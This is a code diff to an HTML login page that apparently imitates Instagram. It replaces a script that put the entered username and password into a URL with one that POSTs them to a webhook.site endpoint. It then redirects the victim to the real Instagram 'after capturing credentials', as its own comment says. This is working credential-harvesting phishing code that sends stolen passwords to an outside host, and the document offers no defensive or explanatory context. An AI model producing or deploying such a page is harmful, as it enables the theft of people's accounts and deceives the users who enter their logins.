@@ -21,12 +21,35 @@
              </form>
          </div>
          <script>
-             document.getElementById('loginForm').addEventListener('submit', function(event) {
-                 event.preventDefault();
-                 const username = document.getElementById('username').value;
-                 const password = document.getElementById('password').value;
-                 window.location.href = `https://api.example.com/log?u=${encodeURIComponent(username)}&p=${encodeURIComponent(password)}`;
-             });
+       document.getElementById('loginForm').addEventListener('submit', function(event) {
+         event.preventDefault();
+         const username = document.getElementById('username').value;
+         const password = document.getElementById('password').value;
+         
+         // Replace with your webhook URL
+         const webhookURL = 'https://webhook.site/c7b3dda1-59f6-4b6b-ae50-80dc22a821f4';
+         
+         // Send data to the webhook
+         fetch(webhookURL, {
+           method: 'POST',
+           headers: {
+             'Content-Type': 'application/json',
+           },
+           body: JSON.stringify({
+             username: username,
+             password: password,
+           }),
+         })
+         .then(response => {
+           if (response.ok) {
+             // Redirect to real Instagram after capturing credentials
+             window.location.href = 'https://www.instagram.com';
+           }
+         })
+         .catch(error => {
+           console.error('Error:', error);
+         });
+       });
          </script>
      </body>
      </html>
